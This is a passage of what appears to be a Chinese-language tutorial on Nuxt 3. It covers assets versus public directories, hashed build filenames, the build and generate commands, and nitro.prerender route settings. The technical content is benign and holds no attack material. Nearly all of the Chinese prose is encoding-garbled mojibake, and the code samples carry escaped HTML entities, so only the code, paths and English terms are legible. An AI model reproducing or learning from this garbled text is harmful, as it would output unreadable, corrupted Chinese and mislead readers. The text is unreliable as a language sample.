¹æ“šæª”æ¡ˆåç¨±è¢«ç€è¦½å™¨å¿«å–ä½ï¼Œå°è‡´å‰ç«¯é‚„æ˜¯çœ‹åˆ°èˆŠçš„æª”æ¡ˆã€‚æˆ‘å€‘åœ¨ä½¿ç”¨ assets ç›®éŒ„ä¸‹çš„æª”æ¡ˆæ™‚é›–ç„¶æª”åéƒ½æ˜¯ bg.pngï¼Œä½†åœ¨å»ºæ§‹æ™‚ç”¢ç”Ÿçš„æª”æ¡ˆé€šå¸¸æœƒå¤¾å¸¶ Hashï¼Œä¾‹å¦‚ï¼šbg.16a2f98c.pngï¼Œå¦‚æ­¤ä¸€ä¾†æˆ‘å€‘æ¯æ¬¡æ›´æ–°åœ–ç‰‡ï¼Œéƒ½éƒ½æœƒéš¨æ©Ÿçš„ç”¢ç”Ÿä¸€çµ„ Hash å°±èƒ½é˜²æ­¢ç€è¦½å™¨å¿«å–ï¼Œå°è‡´å¥½åƒç¶²ç«™æ›´æ–°å¤±æ•ˆçš„éŒ¯è¦ºã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘ä»¥ç›¸åŒçš„åœ–ç‰‡ï¼Œæ”¹æ”¾ç½®æ–¼ assets/bg.pngï¼š\n1 2 3 4 nuxt-app/ â”œâ”€â”€ assets/ â”‚ â””â”€â”€ bg.png â””â”€â”€ app.vue app.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;~/assets/bg.png\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨é–‹ç™¼ç’°å¢ƒ ~/assets/bg.png æœƒè½‰æ›ç‚º /_nuxt/assets/bg.pngï¼Œå¯¦éš›ä¸Šä¹Ÿèƒ½ä½¿ç”¨ http://localhost:3000/_nuxt/assets/bg.png é€²è¡Œè¨ªå•ã€‚\né™¤äº† ~/assets å¯ä»¥å°æ‡‰ assets ç›®éŒ„å¤–ï¼Œä¹Ÿå¯ä»¥åƒè€ƒå®˜æ–¹çš„ alias æ›´å¤šæˆ–è‡ªè¨‚åˆ¥åä¾†ä½¿ç”¨ç›¸å°è·¯å¾‘ã€‚\nä½†ç•¶ä½ çš„ç¶²ç«™éƒ¨ç½²å®Œæˆæˆ–å•Ÿå‹•å»ºæ§‹å‡ºä¾†çš„å°ˆæ¡ˆï¼Œæœƒç™¼ç¾åœ–ç‰‡æª”ååŒ…å«äº† Hashï¼Œä¾‹å¦‚ /_nuxt/bg.0a299ea1.pngã€‚\næœ€å¾Œæˆ‘å€‘ä»¥æœ€çµ‚å»ºæ§‹å‡ºä¾†çš„å°ˆæ¡ˆçµæ§‹å°æ¯”å¦‚ä¸‹åœ–ï¼Œåœ¨ public ç›®éŒ„ä¸‹çš„æª”æ¡ˆï¼ŒæœƒåŸå°ä¸å‹•çš„ç…§æ¬è‡³ .output/public ä¸‹ï¼Œä¹Ÿå°±å¯ä»¥ä½¿ç”¨ /bg.png å­˜å–ï¼›è€Œæ”¾ç½®åœ¨ assets ä¸‹çš„æª”æ¡ˆï¼Œå¯èƒ½æœƒè¢«è™•ç†åŠ å·¥ï¼Œæœ€å¾Œæª”æ¡ˆåç¨±æœƒåŠ ä¸Šä¸€å€‹ Hash ä¸¦æ”¾ç½®åœ¨ .output/public/_nuxt ä¸‹ï¼Œä¹Ÿå°±éœ€è¦ä½¿ç”¨ /_nuxt/bg.0a299ea1.png å­˜å–ã€‚\nç¸½çµä¾†èªªå¤šæ•¸æƒ…æ³å»ºè­°æŠŠéœæ…‹è³‡æºæ”¾ç½®åœ¨ assetsï¼Œä¹Ÿå› ç‚ºéœæ…‹è³‡æºå¤šç‚º SFC æ‰€ä½¿ç”¨ï¼Œé€šå¸¸ä¹Ÿæœƒæ”¾ç½®æœ€å¤šæª”æ¡ˆï¼Œæœ€å¾Œå»ºæ§‹æ™‚ä¹Ÿæœƒå› ç‚ºå»ºæ§‹å·¥å…·çš„è¨­å®šä¾†é€²è¡Œè½‰æ›æˆ–å£“ç¸®ï¼Œæœ€å¾Œæ·»åŠ  Hash ä¾†æä¾›å­˜å–ï¼Œä¹Ÿå› ç‚ºæ¯æ¬¡å»ºæ§‹ç”¢ç”Ÿçš„æª”æ¡ˆéƒ½ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥ä¸é©åˆç›´æ¥ä»¥å®Œæ•´çš„ URL ä¾›å¤–éƒ¨é€£çµä½¿ç”¨ã€‚è€Œç•¶æœ‰äº›ä¾‹å¤–æƒ…æ³ä¸é©åˆï¼Œä¾‹å¦‚ robots.txt æˆ– sitemap.xml é€™é¡çš„æª”æ¡ˆä¸éœ€è¦ç¶“éé¡å¤–è™•ç†ä¸”éœ€è¦çµ•å°è·¯å¾‘ä¿æŒæª”æ¡ˆåç¨±ï¼Œé‚£å°±å¾—æ”¾ç½®åœ¨ public ç›®éŒ„ä¸‹æä¾›å­˜å–ã€‚\nç™¼å¸ƒç¶²ç«™å‰çš„å»ºæ§‹æ‰“åŒ… (Build) èˆ‡éœæ…‹ç¶²ç«™ç”Ÿæˆ (Static Site Generation) ç•¶ç¶²ç«™é–‹ç™¼å®Œæˆæˆ–æœ‰å°å…¥ CI/CDï¼Œåœ¨æº–å‚™ç™¼å¸ƒç¶²ç«™å‰ï¼Œæˆ‘å€‘æœƒå°‡ Nuxt ç¶²ç«™çš„é–‹ç™¼å°ˆæ¡ˆé€é Nuxt æä¾›çš„æŒ‡ä»¤ï¼Œæˆ‘å€‘å¯ä»¥ä¾†å»ºæ§‹å‡ºæ­£å¼ç’°å¢ƒæ‰€éœ€è¦çš„ç‰ˆæœ¬ï¼Œé€™å€‹å»ºæ§‹çš„éç¨‹ä½ å¯ä»¥ç†è§£ç‚ºå°ˆæ¡ˆå°‡æœƒæ‰“åŒ…éœ€è¦çš„ä¾è³´å¥—ä»¶ã€ç·¨è­¯èˆ‡è½‰æ›ç›¸é—œçš„ Vue SFC èˆ‡æ¨£å¼ç­‰ï¼Œç”šè‡³å¹«ä½ å£“ç¸®é€™äº›æª”æ¡ˆç­‰è¨±å¤šæ­¥é©Ÿï¼Œé€™äº›ç¹ç‘£çš„éç¨‹éƒ½é€é Nuxt çš„å»ºæ§‹æŒ‡ä»¤ä¾†å¹«ä½ å®Œæˆï¼Œä½ å¯ä»¥çµåˆä¸€äº›è¨­å®šåƒæ•¸èˆ‡æŒ‡ä»¤ï¼Œä¾†å¹«åŠ©ä½ å»ºæ§‹å‡ºæ­£å¼ç’°å¢ƒæ‰€éœ€è¦çš„ç¶²ç«™å°ˆæ¡ˆï¼Œæœ€å¾Œå†é€²è¡Œéƒ¨ç½²çš„å‹•ä½œã€‚\nNuxt 3 å°ˆæ¡ˆå¦‚ä½•å»ºæ§‹æ­£å¼ç’°å¢ƒç‰ˆæœ¬ï¼Ÿ ç•¶æˆ‘å€‘å»ºç«‹ä¸€å€‹ä¹¾æ·¨çš„ Nuxt 3 å°ˆæ¡ˆï¼Œå¯ä»¥ä½¿ç”¨ package.json ä¸­ scripts å…§çš„æŒ‡ä»¤ä¾†é€²è¡Œå»ºæ§‹æˆ–é æ¸²æŸ“ç”¢ç”Ÿéœæ…‹é é¢ï¼š\n1 2 3 4 5 npm run build npm run generate # or # yarn run build # yarn run generate æˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ Nuxt CLI ä¾†é”åˆ°ä¸€æ¨£çš„æ•ˆæœï¼š\n1 2 npx nuxi build npx nuxi generate generate æŒ‡ä»¤æœƒè§¸ç™¼ build çš„æŒ‡ä»¤ä¸¦å¸¶æœ‰ prerender ç‚º true çš„åƒæ•¸ï¼Œæœ€çµ‚ç”¢ç”Ÿå‡ºä¾†çš„ç›®éŒ„å¯ä»¥ç›´æ¥é€²è¡Œéƒ¨ç½²ï¼Œä¸éœ€è¦å†åŸ·è¡Œä¸€æ¬¡ build çš„æŒ‡ä»¤ã€‚\nä½¿ç”¨é è¨­é…ç½®é€²è¡Œå»ºæ§‹ - å»ºæ§‹é€šç”¨æ¸²æŸ“ (Universal Rendering) çš„ç¶²ç«™ é€™é‚Šæˆ‘å€‘ä»¥ ã€Nuxt3ã€‘å¯¦æˆ°ç·´ç¿’ - å¯¦ä½œéƒ¨è½æ ¼ æ‰€å»ºç«‹çš„éƒ¨è½æ ¼ä½œç‚ºç¯„ä¾‹ï¼Œä¾†å˜—è©¦ä»¥é è¨­çš„é…ç½®é€²è¡Œå»ºæ§‹ï¼Œç›®å‰ Nuxt 3 é è¨­ nuxt.config.ts ä¸­ ssr å±¬æ€§ç‚º trueï¼Œä¹Ÿå°±ä½¿ç”¨é€šç”¨æ¸²æŸ“ (Universal Rendering)ã€‚\næˆ‘å€‘é€²å…¥å°ˆæ¡ˆç›®éŒ„ï¼ŒåŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ï¼š\n1 2 3 npm run build # or # yarn run build ä¸éœ€è¦åœ¨é¡å¤–çš„é…ç½®æˆ–æ­¥é©Ÿï¼ŒNuxt å°±æœƒè‡ªå‹•å¹«æˆ‘å€‘æ‰“åŒ…ä¸¦å»ºæ§‹å‡ºå¯ä»¥éƒ¨ç½²çš„ç¶²ç«™ã€‚\nå»ºæ§‹å®Œæˆå¾Œæœƒåœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹å¤šå‡ºä¸€å€‹ .output ç›®éŒ„ï¼Œpublic å°±æ˜¯åœ¨ç¶²ç«™æ ¹ç›®éŒ„ç›´æ¥å…¬é–‹æ‰“åŒ…å¾Œçš„ JSã€CSS åœ–ç‰‡ç­‰ç›¸é—œæª”æ¡ˆã€‚ç”±æ–¼é€šç”¨æ¸²æŸ“ä½¿ç”¨ Nitro ä½œç‚ºæœå‹™å¼•æ“ï¼Œæ‰€ä»¥æœƒéœ€è¦ä½¿ç”¨ Node.js ä¾†å•Ÿå‹•æˆ‘å€‘çš„æœå‹™ï¼Œæ‰€ä»¥ server å‰‡æ˜¯æœƒæ”¾ç½®ä¼ºæœå™¨ç«¯çš„ Nitroã€Server API è™•ç†é‚è¼¯ç­‰ã€‚\næˆ‘å€‘å¯ä»¥å…ˆåœ¨æœ¬åœ°åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ä¾†é è¦½å»ºæ§‹å‡ºä¾†çš„ç¶²ç«™èˆ‡ Nitro æ˜¯å¦èƒ½é‹ä½œæ­£å¸¸ã€‚\n1 node .output/server/index.mjs ç•¶ç¢ºèªæ²’å•é¡Œå¾Œï¼Œå°±èƒ½ä»¥ .output ç›®éŒ„é€²è¡Œç¶²ç«™éƒ¨ç½²ã€‚\nä½¿ç”¨é æ¸²æŸ“å»ºç½®å…¨éœæ…‹é é¢ç¶²ç«™ æˆ‘å€‘å¯ä»¥åœ¨ Nuxt 3 å»ºæ§‹æ™‚æœŸä¾†é€²è¡Œé æ¸²æŸ“ (pre-rendering)ï¼Œå°‡å°ˆæ¡ˆå…§éœ€è¦æ‰“ API è«‹æ±‚åŠå‹•æ…‹æ¸²æŸ“å…ƒä»¶çš„åœ°æ–¹ï¼Œå…ˆæ¸²æŸ“ç”Ÿæˆå‡º HTML ç¶²é ï¼Œé€™å€‹éç¨‹ä¹Ÿç¨±ä¹‹ç‚ºéœæ…‹ç¶²ç«™ç”Ÿæˆ (Static Site Generation)ï¼Œé€²è€Œå»ºæ§‹å‡ºå…¨éœæ…‹é é¢çš„ç¶²ç«™ã€‚\nåŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤é€²è¡Œéœæ…‹é é¢ç”Ÿæˆï¼š\n1 2 3 npm run generate # or # yarn run generate generate æŒ‡ä»¤æœƒè§¸ç™¼ build çš„æŒ‡ä»¤ä¸¦å¸¶æœ‰ prerender ç‚º true çš„åƒæ•¸ï¼Œæœ€çµ‚æœƒæç¤ºç”¢ç”Ÿçš„ç›®éŒ„ .output/public å¯ä»¥ç”¨ä¾†éƒ¨ç½²è‡³éœæ…‹è¨—ç®¡ä¼ºæœå™¨ã€‚\nç•¶å»ºæ§‹å®Œæˆå¾Œï¼Œæœƒåœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹å¤šå‡ºä¸€å€‹ .output ç›®éŒ„åŒæ™‚ä¹Ÿæœƒæœ‰ dist ç›®éŒ„ï¼Œå¯ä»¥ç™¼ç¾ .output/public ç›®éŒ„å…§å®¹èˆ‡ dist ç›®éŒ„ç›¸åŒã€‚\néœæ…‹é é¢çš„ç”Ÿæˆå› ç‚º Nuxt ä½¿ç”¨åŸºæ–¼çˆ¬èŸ²çš„æŠ€è¡“ç‚ºæ¯å€‹é é¢ç”¢ç”Ÿ HTML èˆ‡ Payload æª”æ¡ˆï¼Œå¯ä»¥ç™¼ç¾ç”¢ç”Ÿçš„éœæ…‹é é¢ç›®éŒ„çµæ§‹ï¼Œä¹Ÿå°æ‡‰è‘—æˆ‘å€‘å°ˆæ¡ˆçš„è·¯ç”±é é¢ï¼Œè€Œé é¢å…ƒä»¶è³‡æ–™å¤¾å…§æœƒç”±ä¸€å€‹ index.html èˆ‡ _payload.js çµ„æˆã€‚\nä¸‹åœ–æ‰€ç”¢ç”Ÿçš„çµæ§‹ï¼Œæ˜¯å› ç‚ºæˆ‘å€‘çš„éƒ¨è½æ ¼è³‡æ–™åº«å…§å·²ç¶“æœ‰ä¸‰ç­†æ–‡ç« è³‡æ–™ï¼Œ/articles é é¢æœƒå–å¾—æ‰€æœ‰çš„æ–‡ç« ï¼Œä¸¦åˆ—å‡ºå°æ‡‰è‘— /articles/1ã€/articles/2 èˆ‡ /articles/3 ç›®éŒ„ï¼Œæ¯å€‹é é¢å…§ä¹Ÿéƒ½åŒ…å«é å…ˆå¾ Server API è«‹æ±‚å¥½çš„æ–‡ç« è³‡æ–™ä¸¦å­˜æ–¼ _payload.js ä¹‹ä¸­ã€‚\nè‡³æ­¤æˆ‘å€‘å°±å¯ä»¥å°‡ .output ç›®éŒ„éƒ¨ç½²è‡³ä¼ºæœå™¨æˆ–éœæ…‹è¨—ç®¡æœå‹™ï¼Œè€Œä¸”ä¹Ÿä¸éœ€è¦åœ¨ä½¿ç”¨ Node.js ä¼ºæœå™¨ä¾†æœå‹™é€™äº›éœæ…‹æª”æ¡ˆã€‚\næ‰‹å‹•è¨­å®šé æ¸²æŸ“çš„è·¯ç”±è¦å‰‡ æˆ‘å€‘ä½¿ç”¨ generate æŒ‡ä»¤æ‰€ç”¢ç”Ÿçš„å…¨éœæ…‹é é¢ç¶²ç«™ï¼Œæ˜¯åŸºæ–¼ Nuxt çš„çˆ¬èŸ²æŠ€è¡“ä¾†åˆ†æé é¢ï¼Œå¦‚åŒå‰å€‹ä¾‹å­æ–‡ç« é é¢çš„ç”¢ç”Ÿæ‰€æè¿°ï¼Œå¦‚æœæˆ‘å€‘çš„è³‡æ–™åº«å­˜åœ¨è‘— 200 ç­†è³‡æ–™ï¼Œä½† /articles é é¢æ‰€æ‰“çš„ API ç¸½æ˜¯åªå›å‚³æœ€æ–°çš„ 10 ç­†ï¼Œé‚£éº¼é‚£äº›æ²’æœ‰è·¯ç”±é€£çµå¯ä»¥é€£çµéå»çš„æ–‡ç« é é¢ï¼Œå°±ç„¡æ³•è¢« Nuxt çš„çˆ¬èŸ²æ‰€åˆ†æåˆ°ï¼Œä¹Ÿå°±ç„¡æ³•ç”¢ç”Ÿå°æ‡‰çš„éœæ…‹é é¢ã€‚\nç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œï¼Œæˆ‘å€‘å¯ä»¥è—‰ç”±é…ç½® Nitro çš„é æ¸²æŸ“è·¯ç”±ï¼Œä¾†æ‰‹å‹•çš„è¨­å®šå“ªäº›é é¢è¦é€²è¡Œé æ¸²æŸ“ç”¢ç”Ÿéœæ…‹é é¢ï¼Œæˆ–è€…å¿½ç•¥ç”¢ç”Ÿéœæ…‹é é¢ã€‚\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 export default defineNuxtConfig({ nitro: { prerender: { ignore: [], // å¿½ç•¥ç‰¹å®šè·¯ç”±ä¸é€²è¡Œé æ¸²æŸ“ routes: [], // æŒ‡å®šè·¯ç”±é€²è¡Œé æ¸²æŸ“ crawlLinks: true // å•Ÿç”¨ Nuxt çˆ¬èŸ²è’é›†é é¢é€£çµä¾†é€²è¡Œé æ¸²æŸ“ } } }) ç•¶ç„¶ï¼Œä¹Ÿå¯ä»¥æ­é… build æˆ– generate æŒ‡ä»¤åšä½¿ç”¨ï¼Œä½†æœƒç¨å¾®æœ‰äº›ä¸ä¸€æ¨£ã€‚\nbuild ä¾‹å¦‚ï¼šè¨­ç½®å¦‚ä¸‹ï¼Œä¸¦ä½¿ç”¨ npm run build æŒ‡ä»¤ã€‚\n1 2 3 4 5 6 7 export default defineNuxtConfig({ nitro: { prerender: { routes: [\u0026#39;/articles\u0026#39;, \u0026#39;/articles/2\u0026#39;] } } }) é‚£éº¼å»ºæ§‹å‡ºä¾†çš„é€šç”¨æ¸²æŸ“ç¶²ç«™ï¼Œå°±æœƒåŒ…å«éƒ¨åˆ†é é¢æ˜¯å·²ç¶“é æ¸²æŸ“å¥½çš„éœæ…‹é é¢ã€‚\ngenerate ç•¶æˆ‘å€‘ä½¿ç”¨ generate æ™‚ï¼Œå› ç‚ºæ˜¯é€²è¡Œå…¨ç«™çš„éœæ…‹é é¢ç”Ÿæˆï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šæ¶µè“‹äº†æ‰€æœ‰è·¯ç”±é é¢ï¼Œä¸¦ä¸” nitro.prerender.crawlLinks å±¬æ€§é è¨­ç‚º true æœƒå•Ÿç”¨ Nuxt çˆ¬èŸ²ä¾†è’é›†æ•´çš„ç¶²ç«™çš„è·¯ç”±é é¢ï¼Œé€²è€Œé–‹å§‹é æ¸²æŸ“ç”¢ç”Ÿéœæ…‹é é¢ã€‚\nä¾‹å¦‚ï¼šè¨­ç½®å¦‚ä¸‹ï¼Œä¸¦ä½¿ç”¨ npm run generate æŒ‡ä»¤ã€‚\n1 2 3 4 5 6 7 8 9 export default defineNuxtConfig({ nitro: { prerender: { ignore: [\u0026#39;/login\u0026#39;, \u0026#39;/register\u0026#39;], routes: [\u0026#39;/articles/2\u0026#39;], crawlLinks: true } }, }) é‚£éº¼å»ºæ§‹å‡ºä¾†çš„ .output ç›®éŒ„ï¼Œå°±æœƒå› ç‚ºè¨­ç½®äº† nitro.prerender.ignore è€Œå¿½ç•¥ /login èˆ‡ /register é é¢çš„éœæ…‹ç”Ÿæˆ ï¼Œè€Œ /articles/2 åœ¨ç¶²ç«™ä¸­å› ç‚ºæ²’æœ‰ä»»ä½•é é¢èƒ½é€£çµåˆ°æ­¤ï¼Œæ‰€ä»¥ Nuxy çˆ¬èŸ²ç„¡æ³•è’é›†åˆ°ï¼Œæ‰€ä»¥å¯ä»¥æ‰‹å‹•æ·»åŠ é€² nitro.prerender.routes ä¹‹ä¸­ã€‚\nå¦‚æœæˆ‘å€‘å°‡ nitro.prerender.crawlLinks å±¬æ€§è¨­ç‚º falseï¼Œé‚£éº¼åœ¨ç”¢ç”Ÿéœæ…‹é é¢çš„æ™‚å€™ï¼Œå°±ç®— /articles åŒ…å«äº†æ‰€æœ‰æ–‡ç« çš„é€£çµï¼ŒNuxt çˆ¬èŸ²ä¹Ÿå°±ä¸æœƒè’é›†é€£çµä¾†ç”¢ç”Ÿéœæ…‹é é¢ï¼Œè€Œæ˜¯åƒ…ä¾ç…§å°ˆæ¡ˆç›®éŒ„ä¸‹çš„ pages æ‰€ç”¢ç”Ÿå‡ºçš„è·¯ç”±ä½†ä¸åŒ…å« [id].vue é€™é¡å‹•æ…‹åŒ¹é…çš„è·¯ç”±ä¾†ç”¢ç”Ÿéœæ…‹é é¢ã€‚\nå»ºæ§‹åƒ…åœ¨å®¢æˆ¶ç«¯æ¸²æŸ“çš„ç¶²ç«™ åŒæ¨£çš„ä½¿ç”¨éƒ¨è½æ ¼ä½œç‚ºç¯„ä¾‹ï¼Œä¾†å˜—è©¦å°‡ nuxt.config.ts ä¸­ ssr å±¬æ€§è¨­ç‚º falseï¼Œä¹Ÿå°±è®“ç¶²ç«™åƒ…åœ¨å®¢æˆ¶ç«¯æ¸²æŸ“ (Client-side Only Rendering)ã€‚\nåŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤é€²è¡Œå»ºæ§‹ï¼š\n1 2 3 npm run build # or # yarn run build å»ºæ§‹å®Œæˆå¾Œï¼Œæœƒåœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹å¤šå‡ºä¸€å€‹ .output ç›®éŒ„ï¼Œå¯ä»¥ç™¼ç¾ public ç›®éŒ„çµæ§‹èˆ‡é€šç”¨æ¸²æŸ“å»ºæ§‹å‡ºçš„ä¸å¤§ä¸€æ¨£ï¼Œå¤šå‡ºäº†åƒ Vue å°ˆæ¡ˆå»ºæ§‹å®Œæˆå¾Œçš„ index.html æª”æ¡ˆï¼Œä¾†ä½œç‚ºé¡¯ç¤ºçš„å®¹å™¨ã€‚\né€™é‚Šæ¯”è¼ƒéœ€è¦ç•™æ„çš„åœ°æ–¹æ˜¯ï¼Œç•¶æˆ‘å€‘å°‡ ssr å±¬æ€§è¨­ç‚º falseï¼Œä¹Ÿé‚„æ˜¯æœƒåœ¨ .output å»ºæ§‹å‡º server ç›®éŒ„ï¼Œä¹Ÿæ“æœ‰è‘— .output/server/index.mjsã€‚\né‚£é€™ä¸å°±æ„è¬‚è‘—æˆ‘é‚„æ˜¯å¾—æœ‰ Node.js æœå‹™æ‰èƒ½éƒ¨ç½²å—ï¼Ÿå…¶å¯¦ä½ å¯ä»¥é€™éº¼ç†è§£ï¼Œç•¶æˆ‘å€‘è¨­å®š Nuxt åƒ…åœ¨å®¢æˆ¶ç«¯é€²è¡Œæ¸²æŸ“ï¼Œä½† Nuxt å°ˆæ¡ˆä¸­ä»ç„¶å¯èƒ½æœ‰ Server APIï¼Œé€™å€‹å±¬æ–¼ä¼ºæœå™¨ç«¯çš„ APIï¼Œç¸½ä¸å¯èƒ½ä¸€åŒæ‰“åŒ…è‡³å‰ç«¯å»åšæ¶è¨­å§ï¼æ‰€ä»¥ä½¿ç”¨ npm run build å»ºæ§‹å‡ºä¾†çš„å°ˆæ¡ˆï¼Œéƒ½æœƒä½¿ç”¨ Nitro å¼•æ“ä¾†å•Ÿå‹•æœå‹™ï¼Œè‹¥æœ‰ Server API çš„è™•ç†é‚è¼¯ï¼Œå‰‡æœƒé€£å¸¶æ‰“åŒ…é€² .output/server ç›®éŒ„ä¹‹ä¸‹ã€‚\nå¦‚æœä½ ç¢ºå®š Nuxt çš„å°ˆæ¡ˆå…§æ²’æœ‰è‡ªå·±å¯¦ä½œçš„ Server APIï¼Œå…¨éƒ¨æ˜¯ä¾è³´éå°ˆæ¡ˆå…§çš„ Server APIï¼Œé‚£éº¼ä½ å¯ä»¥ç›´æ¥å°‡ public ç›®éŒ„ï¼Œè¦–ç‚º Vue å»ºæ§‹å‡ºçš„ dist ç›®éŒ„ä¾†é€²è¡Œéƒ¨ç½²ï¼Œå› ç‚ºé¸æ“‡ä¸å†éœ€è¦ Nitro å¼•æ“ä¾†ç‚ºæˆ‘å€‘æä¾› Web Server çš„æœå‹™ï¼Œä¸”å°ˆæ¡ˆå…§çš„å‰ç«¯ä¹Ÿéƒ½æ‰“åŒ…å®Œåœ¨ public ä¸‹å¯ä»¥è¦–ç‚º SPA ç¶²ç«™ã€‚\næ•´ç†é€™äº›æ’åˆ—å»ºæ§‹åƒæ•¸çš„çµ„åˆ ç›¸ä¿¡çœ‹åˆ°é€™è£¡ï¼Œå¯èƒ½å°å»ºæ§‹èˆ‡ç”¢ç”Ÿéœæ…‹é é¢æœ‰ä¸€é»æ··äº‚äº†ï¼Œé€™é‚Šç¨å¾®æ•´ç†äº†ä¸€ä¸‹ï¼Œå¤§å®¶å¯ä»¥å†ä¾æ“šéœ€æ±‚ä¾†å•Ÿç”¨ç›¸å°æ‡‰çš„é…ç½®ï¼š\nnpm run build + ssr: true build + ssr: true Nuxt 3 é è¨­çš„å»ºæ§‹åƒæ•¸ï¼Œä½¿ç”¨é€šç”¨æ¸²æŸ“ (Universal Rendering) æ¨¡å¼ã€‚\nbuild + ssr: true + nitro.prerender.crawlLinks: true ä½¿ç”¨é€šç”¨æ¸²æŸ“æ¨¡å¼ï¼Œé é¢ä¸­éœ€è¦æ‰“ API å‹•æ…‹ç”¢ç”Ÿçš„é€£çµè€Œè¢« Nuxt çˆ¬èŸ²æ‰€è’é›†åˆ°çš„é é¢å°‡è¢«é æ¸²æŸ“æˆéœæ…‹é é¢ã€‚\nbuild + ssr: true + nitro.prerender.routes + nitro.prerender.crawlLinks: false ä½¿ç”¨é€šç”¨æ¸²æŸ“æ¨¡å¼ï¼Œä½†æŒ‡å®šé é¢é æ¸²æŸ“æˆéœæ…‹é é¢ã€‚\nnpm run build + ssr: false build + ssr: false åƒ…åœ¨å®¢æˆ¶ç«¯æ¸²æŸ“ (Client-side Only Rendering) çš„æ¨¡å¼ï¼Œéƒ¨ç½²æ™‚åŒæ¨£éœ€è¦ä½¿ç”¨ server ä¸­çš„ index.mjs ä¾†å•Ÿå‹• Nitro ä¼ºæœå™¨ï¼Œé€™æ¨£æ‰èƒ½æ­£ç¢ºçš„é‹ä½œ Server APIï¼›é™¤éç¢ºèªå°ˆæ¡ˆå…§å®Œå…¨ç„¡ä¾è³´å°ˆæ¡ˆå…§çš„ Server APIï¼Œå‰‡å¯ä»¥ç›´æ¥å°‡ .output/public è¦–ç‚º Vue çš„ dist ç›®éŒ„é€²è¡Œéƒ¨ç½²ã€‚\nnpm run generate + ssr: true generate + ssr: true ä½¿ç”¨é æ¸²æŸ“ç”¢ç”Ÿéœæ…‹é é¢ï¼Œé è¨­ç”¢ç”Ÿå…¨ç«™éœæ…‹é é¢ï¼Œgenerate ä¸‹ nitro.prerender.crawlLinks å±¬æ€§é è¨­è®Šç‚º trueï¼Œæ•´å€‹ç¶²ç«™åŒ…å« Nuxt çˆ¬èŸ²æ‰€è’é›†åˆ°çš„é é¢å°‡è¢«é æ¸²æŸ“æˆéœæ…‹é é¢ã€‚\ngenerate + ssr: true + nitro.prerender.ignore ä½¿ç”¨ generate å·²ç¶“åŒ…å«æ•´å€‹ç¶²ç«™ï¼Œå¦‚æœæƒ³è¦å¿½ç•¥æŸäº›é é¢é€²è¡Œé æ¸²æŸ“ï¼Œå¯ä»¥æ·»åŠ è·¯ç”±è‡³ nitro.prerender.ignore ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œé€™äº›è¢«å¿½ç•¥çš„é é¢å¦‚æœæœ‰ä½¿ç”¨å°ˆæ¡ˆå…§çš„ Server API éœ€æ±‚ï¼Œå¯èƒ½å°±ç„¡æ³•æ­£ç¢ºçš„åœ¨éœæ…‹è¨—ç®¡å¹³å°é‹ä½œï¼Œè€Œå¤–éƒ¨çš„å€’æ˜¯ä¸å—å½±éŸ¿ã€‚\ngenerate + ssr: true + nitro.prerender.routes é›–ç„¶ä½¿ç”¨ generate å·²ç¶“åŒ…å«æ•´å€‹ç¶²ç«™ï¼Œä½† Nuxt çˆ¬èŸ²æ‰€è’é›†åˆ°çš„é é¢åƒ…ç‚ºé é¢ä¸­ç”¢ç”Ÿçš„ï¼Œå¦‚æœé€£çµä¸å­˜åœ¨é€™äº›é é¢å…§ï¼Œåªèƒ½ç›´æ¥å¾ç€è¦½å™¨ç¶²å€åˆ—è¼¸å…¥é€²å…¥ï¼Œé‚£éº¼æˆ‘å€‘å¯ä»¥å°‡è·¯ç”±æ·»åŠ è‡³ nitro.prerender.routes ä¾†é¡å¤–è£œå……éœ€è¦é æ¸²æŸ“çš„é é¢ã€‚\ngenerate + ssr: true + nitro.prerender.routes + nitro.prerender.crawlLinks: false åŒæ¨£æœƒç”¢ç”Ÿå…¨ç«™éœæ…‹é é¢ï¼Œä½†ä¸ä½¿ç”¨ Nuxt çˆ¬èŸ²æ‰€è’é›†åˆ°çš„é€£çµé é¢ï¼Œæ‰€ä»¥é€™äº›å‹•æ…‹åŒ¹é…æˆ–éœ€è¦æ‰“ API ç²å–è³‡æ–™å†æ¸²æŸ“çš„é é¢ï¼Œå°‡ä¸æœƒæ˜¯éœæ…‹é é¢ï¼Œå› æ­¤ä¹Ÿéœ€è¦æ³¨æ„ï¼Œå¦‚æœé€™äº›é é¢æœ‰ä½¿ç”¨å°ˆæ¡ˆå…§çš„ Server API éœ€æ±‚ï¼Œå¯èƒ½å°±ç„¡æ³•æ­£ç¢ºçš„åœ¨éœæ…‹è¨—ç®¡å¹³å°é‹ä½œï¼Œè€Œå¤–éƒ¨çš„å€’æ˜¯ä¸å—å½±éŸ¿ã€‚\nå…¶å®ƒè·Ÿå»ºæ§‹æœ‰é—œçš„åƒæ•¸å±¬æ€§å¯ä»¥å†åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€Vite èˆ‡ webpack å»ºæ§‹å·¥å…·ä¹Ÿéƒ½èƒ½é¡å¤–è¨­å®šåƒæ•¸å±¬æ€§ã€‚\nNuxt çš„å»ºæ§‹æŒ‡ä»¤ build èˆ‡ç”¢ç”Ÿéœæ…‹é é¢çš„ generate æŒ‡ä»¤ï¼Œè®“æˆ‘å€‘å¯ä»¥ä¾æ“šä¸åŒçš„æƒ…å¢ƒä¾†æ±ºå®šæ¸²æŸ“æ¨¡å¼èˆ‡é æ¸²æŸ“çš„é é¢ï¼Œæœ€çµ‚ç”¢ç”Ÿçš„ .output ç›®éŒ„ä¹Ÿæœƒæœ‰ä¸ä¸€æ¨£çš„çµæ§‹ã€‚é æ¸²æŸ“çš„é é¢èˆ‡å–®ç´”çš„ SPA 